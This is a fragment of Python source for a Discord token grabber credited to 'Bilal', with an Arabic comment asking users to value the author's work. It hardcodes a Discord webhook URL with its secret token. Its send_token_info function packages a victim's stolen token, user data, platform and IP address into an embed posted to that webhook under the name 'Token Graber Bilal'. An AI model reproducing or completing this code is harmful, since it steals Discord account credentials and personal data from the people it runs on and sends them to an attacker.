...
# Author: Bilal
# Discord : e3fo
# الرجاء لكل من يستخدم هاذي الاداة ارجو انك تقدر تعبي فيه لاني بشتغل فيه الي 4 ايام متواصل عدا الدراسة والبحث والتفكير الي اخذ مني مدة طويلة, وشكرا
...
WEBHOOK_URL = 'https://discord.com/api/webhooks/1492582194965905499/C6Lvm_wYfBtsbe4EVCljtAB3b-AuhIcdxbms-7l-5DUzwAejHUFRtD_ugDf-DaIuD7t3'  
...
def send_token_info(token, user_data, platform, ip):
    try:
        ...
        embed = {
            "username": "Token Graber Bilal",
            "avatar_url": "https://media.discordapp.net/attachments/1489369295325495296/1492620993079021568/discord-logo-3d-social-media-icon-isolated_47987-11941.avif?ex=69dbff20&is=69daada0&hm=2d39038c20473e9b8dad9cda16e226aaf03a7c4b408c909a56f4e9af972776ff&=&format=webp&quality=lossless&width=927&height=927",
            "content": "@everyone",
            "embeds": [
                {
